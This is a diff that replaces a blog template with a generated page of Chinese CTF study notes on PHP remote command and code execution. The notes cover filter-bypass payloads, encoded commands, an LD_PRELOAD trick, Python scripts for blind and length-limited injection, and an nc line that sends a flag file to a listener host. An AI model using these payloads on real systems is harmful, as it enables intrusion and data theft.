@@ -1,37 +1,1613 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介利用RCE漏洞，有两种执行方式，向后台服务器远程注入操作系统命令（即远程命令执行RemoteCommand Exec）或者远程代码执行（Remote Code Exec），顾名思义就是远程执行，通过上述的远程注入后，从而执行系统命令，进而控制后台系统。 可能存在代码执行漏洞的函数123eval() 把字符串当作 PHP 代码来执行，必须以分号结尾assert()断言函数 在RCE漏洞里的作用和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="http://example.com/RCE.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="简介利用RCE漏洞，有两种执行方式，向后台服务器远程注入操作系统命令（即远程命令执行RemoteCommand Exec）或者远程代码执行（Remote Code Exec），顾名思义就是远程执行，通过上述的远程注入后，从而执行系统命令，进而控制后台系统。 可能存在代码执行漏洞的函数123eval() 把字符串当作 PHP 代码来执行，必须以分号结尾assert()断言函数 在RCE漏洞里的作用和">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/209.png">
+<meta property="og:image" content="http://example.com/img/210.png">
+<meta property="og:image" content="http://example.com/img/image-20231004152802121.png">
+<meta property="og:image" content="http://example.com/img/image-20231004153347989.png">
+<meta property="og:image" content="http://example.com/img/image-20231004153844400.png">
+<meta property="og:image" content="http://example.com/img/image-20231004155324153.png">
+<meta property="og:image" content="http://example.com/img/image-20231004155404504.png">
+<meta property="og:image" content="http://example.com/img/image-20231004162921283.png">
+<meta property="og:image" content="http://example.com/img/image-20231004165232234.png">
+<meta property="og:image" content="http://example.com/img/image-20231004172311642.png">
+<meta property="og:image" content="http://example.com/img/image-20231004172346355.png">
+<meta property="og:image" content="http://example.com/img/image-20231004172724167.png">
+<meta property="og:image" content="http://example.com/img/image-20231004174514182.png">
+<meta property="og:image" content="http://example.com/img/image-20231004174931318.png">
+<meta property="og:image" content="http://example.com/img/image-20231004175411925.png">
+<meta property="og:image" content="http://example.com/img/image-20231004175606270.png">
+<meta property="og:image" content="http://example.com/img/image-20231004181151061.png">
+<meta property="og:image" content="http://example.com/img/image-20231004182710990.png">
+<meta property="og:image" content="http://example.com/img/image-20231005152101653.png">
+<meta property="og:image" content="http://example.com/img/image-20231006190337511.png">
+<meta property="og:image" content="http://example.com/img/image-20231006191837124.png">
+<meta property="og:image" content="http://example.com/img/image-20231006192722087.png">
+<meta property="og:image" content="http://example.com/img/image-20231103171911467.png">
+<meta property="og:image" content="http://example.com/img/image-20231103205530367.png">
+<meta property="og:image" content="http://example.com/img/image-20231103210617480.png">
+<meta property="og:image" content="http://example.com/img/image-20231103210652828.png">
+<meta property="og:image" content="http://example.com/img/image-20231103203049540.png">
+<meta property="og:image" content="http://example.com/img/image-20231103203841690.png">
+<meta property="og:image" content="http://example.com/img/image-20231103235954752.png">
+<meta property="og:image" content="http://example.com/img/image-20231104001130588.png">
+<meta property="og:image" content="http://example.com/img/image-20231104001910198.png">
+<meta property="og:image" content="http://example.com/img/image-20231112230337261.png">
+<meta property="og:image" content="http://example.com/img/image-20231104002343239.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003019833.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003059244.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003153294.png">
+<meta property="og:image" content="http://example.com/img/image-20231104130201014.png">
+<meta property="og:image" content="http://example.com/img/image-20231112202231149.png">
+<meta property="og:image" content="http://example.com/img/image-20231112202139950.png">
+<meta property="og:image" content="http://example.com/img/image-20231112230712077.png">
+<meta property="og:image" content="http://example.com/img/image-20231112234238787.png">
+<meta property="og:image" content="http://example.com/img/image-20231112234746414.png">
+<meta property="og:image" content="http://example.com/img/image-20231112234828265.png">
+<meta property="og:image" content="http://example.com/img/image-20231112234920206.png">
+<meta property="og:image" content="http://example.com/img/image-20231120214646113.png">
+<meta property="og:image" content="http://example.com/img/image-20231120215859623.png">
+<meta property="og:image" content="http://example.com/img/image-20231120220006750.png">
+<meta property="og:image" content="http://example.com/img/image-20231120220033245.png">
+<meta property="og:image" content="http://example.com/img/image-20231123213548451.png">
+<meta property="og:image" content="http://example.com/img/image-20231126145455076.png">
+<meta property="og:image" content="http://example.com/img/206.png">
+<meta property="og:image" content="http://example.com/img/207.png">
+<meta property="og:image" content="http://example.com/img/image-20231103210617480.png">
+<meta property="og:image" content="http://example.com/img/image-20231103210652828.png">
+<meta property="og:image" content="http://example.com/img/image-20231123211213371.png">
+<meta property="og:image" content="http://example.com/img/image-20231104001910198.png">
+<meta property="og:image" content="http://example.com/img/image-20231112230337261.png">
+<meta property="og:image" content="http://example.com/img/image-20231104002343239.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003019833.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003059244.png">
+<meta property="og:image" content="http://example.com/img/image-20231104003153294.png">
+<meta property="og:image" content="http://example.com/img/image-20231123210800598.png">
+<meta property="og:image" content="http://example.com/img/image-20231123210811018.png">
+<meta property="article:published_time" content="2023-04-09T01:39:06.000Z">
+<meta property="article:modified_time" content="2023-11-26T07:49:43.419Z">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/209.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/RCE.html"/>
+
+
+
+
+
+  <title>RCE | yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/RCE.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">RCE</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-09T09:39:06+08:00">
+                2023-04-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>利用RCE漏洞，有两种执行方式，向后台服务器远程注入操作系统命令（即远程命令执行RemoteCommand Exec）或者远程代码执行（Remote Code Exec），顾名思义就是远程执行，通过上述的远程注入后，从而执行系统命令，进而控制后台系统。</p>
+<h2 id="可能存在代码执行漏洞的函数"><a href="#可能存在代码执行漏洞的函数" class="headerlink" title="可能存在代码执行漏洞的函数"></a>可能存在代码执行漏洞的函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval() 把字符串当作 PHP 代码来执行，必须以分号结尾</span><br><span class="line">assert()断言函数 在RCE漏洞里的作用和eval相当且不需要加分号</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.开发人员调用了能够执行系统命令的函数<br>2.这个函数的参数可控（即用户能够控制）<br>3.开发人员没有对该函数的参数进行过滤或过滤不严</p>
+<h3 id="执行系统命令的函数"><a href="#执行系统命令的函数" class="headerlink" title="执行系统命令的函数"></a>执行系统命令的函数</h3><blockquote>
+<p>system()、passthru()、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()、反引号</p>
+</blockquote>
+<p>需要关注的点：函数有没有回显、需要什么参数<br><strong>1、system()</strong><br>提交命令-&gt;回显<br><strong>2、exec()</strong><br>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )；<br>如果只提供command参数只会返回最后一行，添加output参数（使用一个变量接收），内容就会填充此数组，后使用print_r或var_dump函数输出变量<br>windows环境使用dir参看当前目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &#x27;dir&#x27;;</span><br><span class="line">exec($cmd,$dazhuang);</span><br><span class="line">var_dump($dazhuang);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/209.png"><br>ps：exec函数需要使用输出函数输出<br><strong>3、passthru()</strong><br>passthru(string $command…)<br>可以直接回显，输入指令即可,和system相似<br><strong>4、shell_exec()</strong><br>shell_exec(string $cmd),cmd:要执行的命令<br>使用echo、print输出结果，返回结果是字符串的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;dir&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/210.png"><br>效果和反引号一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=&#x27;dir&#x27;;</span><br><span class="line">echo `$cmd`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>5、popen()</strong><br>popen(string $command,string $mode)<br>mode:模式，’r’表示阅读，’w’表示写入<br>在r模式下，先fgets获取内容，然后print_r输出内容<br>相当于把命令执行的结果当作一个临时文档（进程），要选择写入或者读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s = popen(&#x27;dir&#x27;,&#x27;r&#x27;);</span><br><span class="line">$b =fgets($s);</span><br><span class="line">print_r($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>6、proc_open()比较麻烦，默认没有回显</p>
+<p><strong>7、pcntl_exec()</strong></p>
+<p>pcntl_ exec(string $path, array $args&#x3D; ?, array $envs&#x3D; ?)</p>
+<p>path:必须是可执行二进制文件路径，args：是一个要传递给程序的参数字符串数组</p>
+<h3 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h3><p>使用场景：disable_ _functions禁用所有可能用到命令执行的函数</p>
+<p>动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接</p>
+<p><code>LD_PRELOAD</code>可以修改库文件，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
+<p><code>mail</code>(常用）：内嵌在php中，<code>imagick</code>：需要扩展安装</p>
+<p><img src="/img/image-20231004152802121.png" alt="image-20231004152802121"></p>
+<p><img src="/img/image-20231004153347989.png" alt="image-20231004153347989"></p>
+<p>mail函数在调用sendmail后会再调用动态链接库，而LD_PRELOAD规定优先调用的动态链接库，putenv函数可以修改LD_PRELOAD</p>
+<p><img src="/img/image-20231004153844400.png" alt="image-20231004153844400"></p>
+<p>所以我们需要上传的是demo.so(geteuid函数重定义)和demo.php</p>
+<p><img src="/img/image-20231004155324153.png" alt="image-20231004155324153"></p>
+<p><img src="/img/image-20231004155404504.png" alt="image-20231004155404504"></p>
+<p>反弹shell不太懂，先等等</p>
+<p>但是使用蚁剑自带的插件就能绕过disable_functions</p>
+<p><img src="/img/image-20231004162921283.png" alt="image-20231004162921283"></p>
+<p><img src="/img/image-20231004165232234.png" alt="image-20231004165232234"></p>
+<h3 id="linux连接符"><a href="#linux连接符" class="headerlink" title="linux连接符"></a>linux连接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 把前面命令的输出结果当成后面命令的参数，只显示后面命令执行结果</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; 前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行后面的命令</span><br><span class="line">; 顺序执行，前面指令出错不影响后面的指令执行      </span><br></pre></td></tr></table></figure>
+<p><code>/bin/bash -c ls</code>和<code>echo &quot;ls&quot; | /bin/bash</code>效果一样</p>
+<p><code>/bin/bash</code>：这部分指定了要使用的 shell，指定了要使用 Bash shell。<code>-c</code>：用于告诉 Bash shell 后面的参数是要执行的命令,linux中的shell：bash、sh、dash等等</p>
+<h3 id="linux绕过"><a href="#linux绕过" class="headerlink" title="linux绕过"></a>linux绕过</h3><p>？ *替代一些被过滤的关键字，让系统自动匹配</p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul>
+<li><p>{cat,&#x2F;flag}</p>
+</li>
+<li><p>$IFS   &#x2F;&#x2F;$IFS在linux下表示内部字段分隔符</p>
+</li>
+<li><p>${IFS}</p>
+</li>
+<li><p>$IFS$9</p>
+</li>
+<li><p>&lt;</p>
+</li>
+<li><p>&lt;&gt;</p>
+</li>
+<li><p>%20 (space)</p>
+</li>
+<li><p>%0a(换行)</p>
+</li>
+<li><p>%09 (tab)</p>
+</li>
+<li><p>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p>
+</li>
+</ul>
+<h3 id="读取文件绕过"><a href="#读取文件绕过" class="headerlink" title="读取文件绕过"></a>读取文件绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tac:反向显示  </span><br><span class="line">less/more:一页一页显示文件内容，敲空格显示下一页</span><br><span class="line">tail:查看末尾几行，默认最后10行</span><br><span class="line">nl：显示的时候，顺便标注行号</span><br><span class="line">od：以二进制的方式读取文件内容 //显示是以16进制</span><br><span class="line">xxd:读取二进制文件</span><br><span class="line">sort：主要用于排序文件</span><br><span class="line">uniq:报告或删除文件中重复的行</span><br><span class="line">file -f：报错出具体内容</span><br><span class="line">grep:在文本中查找某些字符串</span><br><span class="line">rev:反转文件中的每一行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231004172311642.png" alt="image-20231004172311642"></p>
+<p><code>od -A  d -c  flag.php</code>  </p>
+<p><img src="/img/image-20231004172346355.png" alt="image-20231004172346355"></p>
+<p><code>xxd test.php</code></p>
+<p><img src="/img/image-20231004172724167.png" alt="image-20231004172724167"></p>
+<p><code>/usr/bin/sort test.php</code> 等效于 <code>sort test.php</code>，也可以<code>/usr/bin/s?rt test.php</code>,使用?自动匹配，可以在sort被过滤的时候尝试 。&#x2F;usr&#x2F;bin:存放用户可执行的程序</p>
+<p><img src="/img/image-20231004174514182.png" alt="image-20231004174514182"></p>
+<p><code>file -f  test.php</code></p>
+<p><img src="/img/image-20231004174931318.png" alt="image-20231004174931318"></p>
+<p><code>grep fl test.php</code></p>
+<p><img src="/img/image-20231004175411925.png" alt="image-20231004175411925"></p>
+<p><img src="/img/image-20231004175606270.png" alt="image-20231004175606270"></p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>绕过原理：命令编码后上传到服务器，绕过过滤限制，服务器解码读取命令并执行</p>
+<p>绕过方法：base64、32、HEX编码（ascii）、shellcode(16进制的机器码)</p>
+<p>&#x2F;bin&#x2F;bash、bash、sh、反引号、$()都可以实现</p>
+<p><code>echo Y2F0IHRlc3QucGhw | base64 -d | /bin/bash </code></p>
+<p><code>$(echo Y2F0IHRlc3QucGhw | base64 -d)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo Y2F0IHRlc3QucGhw | base64 -d`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231004181151061.png" alt="image-20231004181151061"></p>
+<p><code>echo &quot;74616320746573742e706870&quot; | xxd -r -p | bash</code></p>
+<p>xxd -r -p将16进制反向输出打印为ascii格式</p>
+<p><img src="/img/image-20231004182710990.png" alt="image-20231004182710990"></p>
+<p>但是xxd是个工具，不是所有的服务器都装有，这种情况下可以使用shellcode编码绕过</p>
+<p><code>printf &quot;\x63\x61\x74\x20\x74\x65\x73\x74\x2e\x70\x68\x70&quot; | bash</code>也可以试一下echo，可能在目标服务器无法执行，shellcode编码可以被服务器识别<br>在遇到post中空格被过滤可以使用\x09，换行\x0a(攻防世界 unseping)</p>
+<h3 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h3><p>页面无法shel反弹或者无法回显，或者没有写入权限，可尝试命令盲注，根据返回的时间来进行判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $(cat ./test.php | awk NR==1 | cut -c 1) == h  ];then sleep 2;fi</span><br></pre></td></tr></table></figure>
+
+<p>awk NR&#x3D;&#x3D;1获取第一行，cut -c 获取单个字符，if为真则执行then，否则执行fi结束。特殊字符要\转义</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">url = <span class="string">&quot;http://192.168.1.6:18000/class08/1.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if [ `ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload,timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h3><p><code>&gt;</code>创建文件并写入或者<code>覆盖</code>文件原本的内容 ,<code>&gt;b</code>直接创建文件<br><code>&gt;&gt;</code>追加内容<br>在没有写完的命令后面加<code>\</code>,可以将一条命令写在多行<br><img src="/img/image-20231005152101653.png" alt="image-20231005152101653"></p>
+<p><code>ls -t</code>按修改时间排序，最新优先 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;l \\</span><br><span class="line">&gt;f \\</span><br><span class="line">&gt;cat\ \\</span><br><span class="line">ls -t &gt;x</span><br><span class="line">.x(sh x)  //执行了cat flag</span><br></pre></td></tr></table></figure>
+
+<p><code>\\</code>把后面的\转义成普通字符<br><code>dir</code>:按列输出，不换行；d字符靠前<br><code>*</code>相当于$(dir *):将第一个文件名作为命令，把后续的文件名作为参数，输出执行结果。ls会换行，不行</p>
+<h3 id="长度过滤为7绕过"><a href="#长度过滤为7绕过" class="headerlink" title="长度过滤为7绕过"></a>长度过滤为7绕过</h3><p><img src="/img/image-20231006190337511.png" alt="image-20231006190337511"></p>
+<p>exec函数需要输出函数，这里没有，采用nc反弹，<code>cat flag|nc 192.168.1.161:7777</code>（cat展示内容，通过nc反弹，提交到192.168.1.161，注意管道输出符）,然后kali上输入指令<code>nc -lvp 7777</code>来监听端口</p>
+<p><strong>利用过程</strong></p>
+<p>步骤一：倒序写入，创建文件</p>
+<p><img src="/img/image-20231006191837124.png" alt="image-20231006191837124"></p>
+<p><code>\</code>将空格实体化成字符，注意空格构造，不能输入重复指令，因为文件名不能重复，所以这里采用单独构造空格，<code>c\ \\</code>,<code>t\ \\</code>这样灵活构造，但是在长度过滤为5中空格只能单独构造<br>步骤二： 将文件名按顺序写入到文件<code>ls -t &gt;a</code><br>步骤三：执行脚本<code>sh a</code>  </p>
+<p><img src="/img/image-20231006192722087.png" alt="image-20231006192722087"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#encodeing:utf-8</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = &quot;http://192.168.1.6:19080/index.php?cmd=&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">list=[</span><br><span class="line">    &#x27;&gt;7777&#x27;</span><br><span class="line">    &#x27;\ \\&#x27;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;&gt;ca\\&#x27;</span><br><span class="line">    &#x27;ls -t&gt;a&#x27;</span><br><span class="line">]</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl + str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line">s.get(baseurl+&quot;sh a&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>记得打开kali监听</p>
+<h3 id="长度限制为5绕过"><a href="#长度限制为5绕过" class="headerlink" title="长度限制为5绕过"></a>长度限制为5绕过</h3><h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><p>&#x2F;&#x2F;假设该目录有index.php和flag.php</p>
+<ul>
+<li>cat `ls`相当于执行了 cat index.php;cat flag.php</li>
+<li>cat $(ls) 和上面一个意思<br>&#x2F;&#x2F;可以查看该目录及子目录和隐藏目录所有文件<br>find –</li>
+</ul>
+<h2 id="ctfshow中学到的新姿势"><a href="#ctfshow中学到的新姿势" class="headerlink" title="ctfshow中学到的新姿势"></a>ctfshow中学到的新姿势</h2><p>1、当;被过滤的时候要使用eval函数，由于后面;可以用?&gt;结尾,php代码的最后一个语句可以不用；</p>
+<p>2、当flag或者读取文件被过滤时，可以试试mv、cp</p>
